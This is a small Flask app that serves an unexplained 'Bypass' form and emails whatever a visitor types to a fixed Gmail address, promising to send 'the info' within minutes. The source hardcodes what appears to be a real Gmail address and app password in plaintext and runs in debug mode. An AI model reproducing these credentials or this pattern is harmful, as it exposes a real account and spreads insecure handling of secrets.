from flask import Flask, request, render_template_string
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Bypass Form</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
            background-color: #001f3f;
            color: white;
            font-family: Arial, sans-serif;
        }

        canvas {
            position: fixed;
            top: 0;
            left: 0;
            z-index: 0;
        }

        .form-container {
            position: absolute;
            top: 40%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            z-index: 2;
        }

        input[type="text"] {
            background-color: #333;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            width: 300px;
            font-size: 16px;
        }

        button {
            margin-top: 15px;
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            transition: transform 0.3s ease, background 0.3s;
        }

        button:hover {
            background-color: #0056b3;
            transform: scale(1.1);
        }

        .loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        #thankYouMsg {
            position: fixed;
            bottom: 30px;
            width: 100%;
            text-align: center;
            font-size: 20px;
            color: #00ff88;
            display: none;
            z-index: 3;
        }

        #downArrow {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 60px;
            color: red;
            z-index: 3;
        }
    </style>
</head>
<body>
<canvas id="dotsCanvas"></canvas>

<div class="form-container">
    <form id="bypassForm">
        <input type="text" name="user_input" placeholder="Type something" required><br>
        <button type="submit">Bypass</button>
        <div class="loader" id="loader" style="display: none;"></div>
    </form>
</div>

<div id="thankYouMsg">Thank you, we will email you the info within 5 mins.</div>
<div id="downArrow">&#8595;</div>

<script>
    const form = document.getElementById("bypassForm");
    const loader = document.getElementById("loader");
    const thankYou = document.getElementById("thankYouMsg");
    const downArrow = document.getElementById("downArrow");

    form.addEventListener("submit", function(e) {
        e.preventDefault();
        loader.style.display = "block";

        const input = form.user_input.value;

        fetch("/", {
            method: "POST",
            headers: {"Content-Type": "application/x-www-form-urlencoded"},
            body: "user_input=" + encodeURIComponent(input)
        }).then(() => {
            setTimeout(() => {
                loader.style.display = "none";
                thankYou.style.display = "block";
                downArrow.style.display = "block";
            }, 2000);
        });
    });

    // Background dots animation
    const canvas = document.getElementById('dotsCanvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const dots = [];
    for (let i = 0; i < 100; i++) {
        dots.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height,
            vx: (Math.random() - 0.5) * 1,
            vy: (Math.random() - 0.5) * 1
        });
    }

    function drawDots() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        for (let i = 0; i < dots.length; i++) {
            let d = dots[i];
            d.x += d.vx;
            d.y += d.vy;

            if (d.x < 0 || d.x > canvas.width) d.vx *= -1;
            if (d.y < 0 || d.y > canvas.height) d.vy *= -1;

            ctx.beginPath();
            ctx.arc(d.x, d.y, 2, 0, Math.PI * 2);
            ctx.fillStyle = "#fff";
            ctx.fill();

            for (let j = i + 1; j < dots.length; j++) {
                let d2 = dots[j];
                let dist = Math.hypot(d.x - d2.x, d.y - d2.y);
                if (dist < 120) {
                    ctx.beginPath();
                    ctx.moveTo(d.x, d.y);
                    ctx.lineTo(d2.x, d2.y);
                    ctx.strokeStyle = "rgba(255,255,255," + (1 - dist / 120) + ")";
                    ctx.stroke();
                }
            }
        }
        requestAnimationFrame(drawDots);
    }

    drawDots();
</script>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        user_input = request.form.get("user_input")
        send_email(user_input)
        return ("", 204)  # Don't refresh the page
    return render_template_string(HTML)

def send_email(content):
    sender_email = "ryandruzb@gmail.com"  # Replace with your email
    receiver_email = "ryandruzb@gmail.com"
    password = "bjov imqo amcu vfjj"  # Use app password if Gmail

    message = MIMEText(f"User submitted: {content}")
    message['Subject'] = "New Form Submission"
    message['From'] = sender_email
    message['To'] = receiver_email

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
    except Exception as e:
        print("Email failed:", e)

if __name__ == "__main__":
    app.run(debug=True)
